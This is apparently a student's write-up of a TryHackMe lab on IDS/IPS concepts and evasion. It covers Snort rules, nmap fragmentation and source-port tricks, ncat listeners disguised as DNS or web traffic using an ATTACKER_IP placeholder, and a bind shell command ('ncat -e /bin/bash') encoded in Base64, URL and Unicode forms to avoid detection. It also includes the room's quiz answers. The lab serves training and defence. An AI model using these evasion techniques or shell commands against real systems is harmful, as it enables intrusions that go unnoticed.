---
Learn about and experiment with various IDS/IPS evasion techniques, such as protocol and payload manipulation.
---

# Network Security Solutions — Writeup

## Overview
### Network Security Solutions — Writeup
### Network Security Solutions — Writeup
![](https://assets.tryhackme.com/room-banners/evasion.png)
### Introduction
An Intrusion Detection System (IDS) is a system that detects network or system intrusions. One analogy that comes to mind is a guard watching live feeds from different security cameras. He can spot a theft, but he cannot stop it by himself. However, if this guard can contact another guard and ask them to stop the robber, detection turns into prevention. An Intrusion Detection and Prevention System (IDPS) or simply Intrusion Prevention System (IPS) is a system that can detect and prevent intrusions.
Understanding the difference between detection and prevention is essential. Snort is a network intrusion detection and intrusion detection system. Consequently, Snort can be set up as an IDS or an IPS. For Snort to function as an IPS, it needs some mechanism to block (drop) offending connections. This capability requires Snort to be set up as inline and to bridge two or more network cards.
As a signature-based network IDS, Snort is shown in the figure below.
The following figure shows how Snort can be configured as an IPS if set up inline.
IDS setups can be divided based on their location in the network into:
Host-based IDS (HIDS)
Network-based IDS (NIDS)
The host-based IDS (HIDS) is installed on an OS along with the other running applications. This setup will give the HIDS the ability to monitor the traffic going in and out of the host; moreover, it can monitor the processes running on the host.
The network-based IDS (NIDS) is a dedicated appliance or server to monitor the network traffic. The NIDS should be connected so that it can monitor all the network traffic of the network or VLANs we want to protect. This can be achieved by connecting the NIDS to a monitor port on the switch. The NIDS will process the network traffic to detect malicious traffic.
In the figure below, we use two red circles to show the difference in the coverage of a HIDS versus a NIDS.
What does an IPS stand for?
*Intrusion Prevention System*
What do you call a system that can detect malicious activity but not stop it?
*Intrusion Detection System*
### IDS Engine Types
We can classify network traffic into:
Benign traffic: This is the usual traffic that we expect to have and don’t want the IDS to alert us about.
Malicious traffic: This is abnormal traffic that we don’t expect to see under normal conditions and consequently want the IDS to detect it.
In the same way that we can classify network traffic, we can also classify host activity. The IDS detection engine is either built around detecting malicious traffic and activity or around recognizing normal traffic and activity. Recognizing “normal” makes it easy to detect any deviation from normal.
Consequently, the detection engine of an IDS can be:
Signature-based: A signature-based IDS requires full knowledge of malicious (or unwanted) traffic. In other words, we need to explicitly feed the signature-based detection engine the characteristics of malicious traffic. Teaching the IDS about malicious traffic can be achieved using explicit rules to match against.
Anomaly-based: This requires the IDS to have knowledge of what regular traffic looks like. In other words, we need to “teach” the IDS what normal is so that it can recognize what is not normal. Teaching the IDS about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules.
Put in another way, signature-based IDS recognizes malicious traffic, so everything that is not malicious is considered benign (normal). This approach is commonly found in anti-virus software, which has a database of known virus signatures. Anything that matches a signature is detected as a virus.
An anomaly-based IDS recognizes normal traffic, so anything that deviates from normal is considered malicious. This approach is more similar to how human beings perceive things; you have certain expectations for speed, performance, and responsiveness when you start your web browser. In other words, you know what “normal” is for your browser. If suddenly you notice that your web browser is too sluggish or unresponsive, you will know that something is wrong. In other words, you knew it when your browser’s performance deviated from normal.
What kind of IDS engine has a database of all known malicious packets’ contents?
*Signature-based*
What kind of IDS engine needs to learn what normal traffic looks like instead of malicious traffic?
*Anomaly-based*
What kind of IDS engine needs to be updated constantly as new malicious packets and activities are discovered?
*Signature-based*
### IDS/IPS Rule Triggering
Each IDS/IPS has a certain syntax to write its rules. For example, Snort uses the following format for its rules: Rule Header (Rule Options), where Rule Header constitutes:
Action: Examples of action include alert, log, pass, drop, and reject.
Protocol: TCP, UDP, ICMP, or IP.
Source IP/Source Port: !10.10.0.0/16 any refers to everything not in the class B subnet 10.10.0.0/16.
Direction of Flow: -> indicates left (source) to right (destination), while <> indicates bi-directional traffic.
Destination IP/Destination Port: 10.10.0.0/16 any to refer to class B subnet 10.10.0.0/16.
Below is an example rule to drop all ICMP traffic passing through Snort IPS:
drop icmp any any -> any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)
The rule above instructs the Snort IPS to drop any packet of type ICMP from any source IP address (on any port) to any destination IP address (on any port). The message to be added to the logs is “ICMP Ping Scan.”
Let’s consider a hypothetical case where a vulnerability is discovered in our web server. This vulnerability lies in how our web server handles HTTP POST method requests, allowing the attacker to run system commands.
Let’s consider the following “naive” approach. We want to create a Snort rule that detects the term ncat in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability.
alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"ncat"; sid: 1000030; rev:1;)
The rule above inspects the content of the packets exchanged with port 80 for the string ncat. Alternatively, you can choose to write the content that Snort will scan for in hexadecimal format. ncat in ASCII is written as 6e 63 61 74 in hexadecimal and it is encapsulated as a string by 2 pipe characters |.
alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"|6e 63 61 74|"; sid: 1000031; rev:1;)
We can further refine it if we expect to see it in HTTP POST requests. Note that flow:established tells the Snort engine to look at streams started by a TCP 3-way handshake (established connections).
alert tcp any any <> any 80 (msg: "Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)
If ASCII logging is chosen, the logs would be similar to the two alerts shown next.
```text
Snort Logs

           
[**] [1:1000031:1] Netcat Exploitation [**]
[Priority: 0] 
01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80
TCP TTL:63 TOS:0x0 ID:34278 IpLen:20 DgmLen:541 DF
***AP*** Seq: 0x26B5C2F  Ack: 0x0  Win: 0x0  TcpLen: 32

[**] [1:1000031:1] Netcat Exploitation [**]
[Priority: 0] 
01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80
TCP TTL:63 TOS:0x0 ID:34278 IpLen:20 DgmLen:541 DF
***AP*** Seq: 0x26B5C2F  Ack: 0xF1090882  Win: 0x3F  TcpLen: 32
TCP Options (3) => NOP NOP TS: 2244530364 287085341
```
There are a few points to make about signature-based IDS and its rules. If the attacker made even the slightest changes to avoid using ncat verbatim in their payload, the attack would go unnoticed. As we can conclude, a signature-based IDS or IPS is limited to how well-written and updated its signatures (rules) are. We discuss some evasion techniques in the next task.
In the attached file, the logs show that a specific IP address has been detected scanning our system of IP address 10.10.112.168. What is the IP address running the port scan?
*10.14.17.226*
### Evasion via Protocol Manipulation
Evading a signature-based IDS/IPS requires that you manipulate your traffic so that it does not match any IDS/IPS signatures. Here are four general approaches you might consider to evade IDS/IPS systems.
Evasion via Protocol Manipulation
Evasion via Payload Manipulation
Evasion via Route Manipulation
Evasion via Tactical Denial of Service (DoS)
This room focuses on evasion using nmap and ncat/socat. The evasion techniques related to Nmap are discussed in great detail in the Firewalls room. This room will emphasize ncat and socat where appropriate.
We will expand on each of these approaches in its own task. Let’s start with the first one. Evasion via protocol manipulation includes:
Relying on a different protocol
Manipulating (Source) TCP/UDP port
Using session splicing (IP packet fragmentation)
Sending invalid packets
Rely on a Different Protocol
The IDS/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and the applications necessary for the target organization to design your attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. In one case, the client relied on Google services for their business, so the attacker used Google web hosting to conceal his malicious site. Unfortunately, it is not a one-size-fits-all; moreover, some trial and error might be necessary as long as you don’t create too much noise.
We have an IPS set to block DNS queries and HTTP requests in the figure below. In particular, it enforces the policy where local machines cannot query external DNS servers but should instead query the local DNS server; moreover, it enforces secure HTTP communications. It is relatively permissive when it comes to HTTPS. In this case, using HTTPS to tunnel traffic looks like a promising approach to evade the IPS.
Consider the case where you are using Ncat. Ncat, by default, uses a TCP connection; however, you can get it to use UDP using the option -u.
To listen using TCP, just issue ncat -lvnp PORT_NUM where port number is the port you want to listen to.
to connect to an Ncat instance listening on a TCP port, you can issue ncat TARGET_IP PORT_NUM
Note that:
-l tells ncat to listen for incoming connections
-v gets more verbose output as ncat binds to a source port and receives a connection
-n avoids resolving hostnames
-p specifies the port number that ncat will listen on
As already mentioned, using -u will move all communications over UDP.
To listen using UDP, just issue ncat -ulvnp PORT_NUM where port number is the port you want to listen to. Note that unless you add -u, ncat will use TCP by default.
To connect to an Ncat instance listening on a UDP port, you can issue nc -u TARGET_IP PORT_NUM
Consider the following two examples:
Running ncat -lvnp 25 on the attacker system and connecting to it will give the impression that it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI).
Executing ncat -ulvnp 162 on the attacker machine and connecting to it will give the illusion that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI.
Manipulate (Source) TCP/UDP Port
Generally speaking, the TCP and UDP source and destination ports are inspected even by the most basic security solutions. Without deep packet inspection, the port numbers are the primary indicator of the service used. In other words, network traffic involving TCP port 22 would be interpreted as SSH traffic unless the security solution can analyze the data carried by the TCP segments.
Depending on the target security solution, you can make your port scanning traffic resemble web browsing or DNS queries. If you are using Nmap, you can add the option -g PORT_NUMBER (or --source-port PORT_NUMBER) to make Nmap send all its traffic from a specific source port number.
While scanning a target, use nmap -sS -Pn -g 80 -F 10.10.11.122 to make the port scanning traffic appear to be exchanged with an HTTP server at first glance.
If you are interested in scanning UDP ports, you can use nmap -sU -Pn -g 53 -F 10.10.11.122 to make the traffic appear to be exchanged with a DNS server.
Consider the case where you are using Ncat. You can try to camouflage the traffic as if it is some DNS traffic.
On the attacker machine, if you want to use Ncat to listen on UDP port 53, as a DNS server would, you can use ncat -ulvnp 53.
On the target, you can make it connect to the listening server using ncat -u ATTACKER_IP 53.
Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server.
On the attacker machine, to get Ncat to listen on TCP port 80, like a benign web server, you can use ncat -lvnp 80.
On the target, connect to the listening server using nc ATTACKER_IP 80.
Use Session Splicing (IP Packet Fragmentation)
Another approach possible in IPv4 is IP packet fragmentation, i.e., session splicing. The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures. If the IDS is looking for a particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless the IDS reassembles the packets, the rule won’t be triggered.
Nmap offers a few options to fragment packets. You can add:
-f to set the data in the IP packet to 8 bytes.
-ff to limit the data in the IP packet to 16 bytes at most.
--mtu SIZE to provide a custom size for data carried within the IP packet. The size should be a multiple of 8.
Suppose you want to force all your packets to be fragmented into specific sizes. In that case, you should consider using a program such as Fragroute. fragroute can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file with ip_frag SIZE to fragment the IP data according to the provided size. The size should be a multiple of 8.
For example, you can create a configuration file fragroute.conf with one line, ip_frag 16, to fragment packets where IP data fragments don’t exceed 16 bytes. Then you would run the command fragroute -f fragroute.conf HOST. The host is the destination to which we would send the fragmented packets it.
Sending Invalid Packets
Generally speaking, the response of systems to valid packets tends to be predictable. However, it can be unclear how systems would respond to invalid packets. For instance, an IDS/IPS might process an invalid packet, while the target system might ignore it. The exact behavior would require some experimentation or inside knowledge.
Nmap makes it possible to create invalid packets in a variety of ways. In particular, two common options would be to scan the target using packets that have:
Invalid TCP/UDP checksum
Invalid TCP flags
Nmap lets you send packets with a wrong TCP/UDP checksum using the option --badsum. An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program.
Nmap also lets you send packets with custom TCP flags, including invalid ones. The option --scanflags lets you choose which flags you want to set.
URG for Urgent
ACK for Acknowledge
PSH for Push
RST for Reset
SYN for Synchronize
FIN for Finish
For instance, if you want to set the flags Synchronize, Reset, and Finish simultaneously, you can use --scanflags SYNRSTFIN, although this combination might not be beneficial for your purposes.
If you want to craft your packets with custom fields, whether valid or invalid, you might want to consider a tool such as hping3. We will list a few example options to give you an idea of packet crafting using hping3.
-t or --ttl to set the Time to Live in the IP header
-b or --badsum to send packets with a bad UDP/TCP checksum
-S, -A, -P, -U, -F, -R to set the TCP SYN, ACK, PUSH, URG, FIN, and RST flags, respectively
There is a myriad of other options. Depending on your needs, you might want to check the hping3 manual page for the complete list.
We use the following Nmap command, nmap -sU -F 10.10.11.122, to launch a UDP scan against our target. What is the option we need to add to set the source port to 161?
*-g 161*
The target allows Telnet traffic. Using ncat, how do we set a listener on the Telnet port?
*ncat lvnp 23*
We are scanning our target using nmap -sS -F 10.10.11.122. We want to fragment the IP packets used in our Nmap scan so that the data size does not exceed 16 bytes. What is the option that we need to add?
*-ff*

## Enumeration
```text
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sF -Pn 10.10.11.122
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-11 11:20 EDT
Nmap scan report for 10.10.11.122
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
8080/tcp open|filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds
```
Start the AttackBox and the attached machine. Consider the following three types of Nmap scans:
-sX for Xmas Scan
-sF for FIN Scan
-sNfor Null Scan
Which of the above three arguments would return meaningful results when scanning 10.10.11.122?
*-sF*
![[Pasted image 20220911102118.png]]
What is the option in hping3 to set a custom TCP window size?
(Refer to hping3 manual page http://www.hping.org/manpage.html (If more than one hping3 option provide the same functionality, use the shorter one.))
### Evasion via Payload Manipulation
Evasion via payload manipulation includes:
Obfuscating and encoding the payload
Encrypting the communication channel
Modifying the shellcode
Obfuscate and Encode the Payload
Because the IDS rules are very specific, you can make minor changes to avoid detection. The changes include adding extra bytes, obfuscating the attack data, and encrypting the communication.
Consider the command ncat -lvnp 1234 -e /bin/bash, where ncat will listen on TCP port 1234 and connect any incoming connection to the Bash shell. There are a few common transformations such as Base64, URL encoding, and Unicode escape sequence that you can apply to your command to avoid triggering IDS/IPS signatures.
Encode to Base64 format
You can use one of the many online tools that encode your input to Base64. Alternatively, you can use base64 commonly found on Linux systems.
```text
pentester@TryHackMe$ cat input.txt
ncat -lvnp 1234 -e /bin/bash
```
```text
$ base64 input.txt
bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==
```
ncat -lvnp 1234 -e /bin/bash is encoded to bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==.
URL Encoding
URL encoding converts certain characters to the form %HH, where HH is the hexadecimal ASCII representation. English letters, period, dash, and underscore are not affected. You can refer to section 2.4 in RFC 3986 for more information.
One utility that you can easily install on your Linux system is urlencode; alternatively, you can either use an online service or search for similar utilities on MS Windows and macOS. To follow along on the AttackBox, you can install urlencode by running the command apt install gridsite-clients.
```text
Pentester Terminal

           
pentester@TryHackMe$ urlencode ncat -lvnp 1234 -e /bin/bash
ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash
```
ncat -lvnp 1234 -e /bin/bash becomes ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash after URL encoding. Depending what the IDS/IPS signature is matching, URL encoding might help evade detection.
Use Escaped Unicode
Some applications will still process your input and execute it properly if you use escaped Unicode. There are multiple ways to use escaped Unicode depending on the system processing the input string. For example, you can use CyberChef to select and configure the Escape Unicode Characters recipe as shown in the image below.
Search for Escape Unicode Characters
Drag it to the Recipe column
Ensure you a check-mark near Encode all chars with a prefix of \u
Ensure you have a check-mark near Uppercase hex with a padding of 4
```cyberchef
input 
ncat -lvnp 1234 -e /bin/bash

recipe: escape unicode characters

output

\u006E\u0063\u0061\u0074\u0020\u002D\u006C\u0076\u006E\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002D\u0065\u0020\u002F\u0062\u0069\u006E\u002F\u0062\u0061\u0073\u0068
```
